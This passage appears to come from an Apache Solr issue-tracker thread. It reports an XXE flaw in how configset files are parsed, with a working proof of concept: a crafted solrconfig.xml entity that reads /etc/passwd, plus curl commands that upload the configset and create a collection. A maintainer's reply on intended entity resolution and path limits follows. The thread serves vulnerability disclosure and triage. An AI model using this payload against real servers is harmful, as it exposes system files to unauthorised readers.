That alarmed me! Our managed-schema and solrconfig.xml parse XXEs!\n\nHere's a very nasty attack I could execute using this and configset upload functionality:\n\nStep 1: Create a configset with just two files in a directory called \"minimal\":\n\nschema.xml:\n\n<schema name=\"minimal\" version=\"1.1\">\n  <fieldType name=\"string\" class=\"solr.StrField\"/>\n  <dynamicField name=\"*\" type=\"string\" indexed=\"true\" stored=\"true\"/>\n</schema>\n\n\n\nsolrconfig.xml\n\n<?xml version=\"1.0\" ?>\n\n<!DOCTYPE doc [\n<!ENTITY passwdFile SYSTEM \"file:///etc/passwd\">\n]>\n<config>\n  <dataDir>${solr.data.dir:}</dataDir>\n  <directoryFactory name=\"DirectoryFactory\"\n                    class=\"${solr.directoryFactory:solr.NRTCachingDirectoryFactory}\"/>\n  <schemaFactory class=\"ClassicIndexSchemaFactory\"/>\n\n  <luceneMatchVersion>7.3.0</luceneMatchVersion>\n  <updateHandler class=\"solr.DirectUpdateHandler2\">\n    <commitWithin>\n      <softCommit>${solr.commitwithin.softcommit:true}</softCommit>\n    </commitWithin>\n  </updateHandler>\n  <requestHandler name=\"/select\" class=\"solr.SearchHandler\">\n    <lst name=\"defaults\">\n      <str name=\"echoParams\">explicit</str>\n      <str name=\"indent\">true</str>\n      <str name=\"df\">text</str>\n      <str name=\"password\">&passwdFile;</str>\n    </lst>\n  </requestHandler>\n</config>\n\n\n\nStep 2: Upload the minimal directory to Solr using configset upload API:\n\n[ishan@x260 solr] $ (cd minimal && zip -r - *) | curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @- \"http://localhost:8983/solr/admin/configs?action=UPLOAD&name=mybadconfigset\"\n  adding: schema.xml (deflated 42%)\n  adding: solrconfig.xml (deflated 50%)\n{\n  \"responseHeader\":{\n    \"status\":0,\n    \"QTime\":23}}\n\n\n\nStep 3: Create a collection using this configset\n\n[ishan@x260 solr] $ curl \"http://localhost:8983/solr/admin/collections?action=CREATE&name=mybadcoll&numShards=1&collection.configName=mybadconfigset\"\n{\n  \"responseHeader\":{\n    \"status\":0,\n    \"QTime\":3431},\n  \"success\":{\n    \"192.168.1.6:8983_solr\":{\n      \"responseHeader\":{\n        \"status\":0,\n        \"QTime\":2062},\n      \"core\":\"mybadcoll_shard1_replica_n1\"}}}\n\n\n\nStep 4: Use Config API to check the select handler's config.

PLEASE DO NOT OVERREACT:\n\n\nHi Ishan, that\u2019s wanted and also documented!\n\nSolrconfig and solrschema are also parsed with enabled \u201cxinclude\u201d, so you have 2 possiblities to read external files. So it\u2019s made for allowing the users to split their config files into multiple ones. You should not allow to escape the Solr folder, because the whole entity resolving and xinclude is limited to SolrResourceLoader (see https://goo.gl/nyJ8J6 in combination with https://goo.gl/s4pcBZ): You should not be able to escape Solr\u2019s home directory. The Entity Resolver used there can optionally not allow this (there is a test). We may enable the \u201cfeature\u201d to restrict to home dir. Ishan could it be that you have enabled: \u201c-Dsolr.allow.unsafe.resourceloading=true\u201d ?\n\nI have many people that use conventional schema.xml and solrconfig.xml files that are split intro multiple files, so we have to keep\n\nIMHO: It could only be broken now, because the above check in SolrResourceLoader is no longer working correctly because of some zookeeper changes. Theoretically you should only be able to load files using SolrResourceLoader from the same directory/zookeeper node that solr has as \u201croot\u201d.\n\nSo the issue seems there, but may also be a config problem.\n\nCan you give your log file when booting up solr?\n\nUwe ",
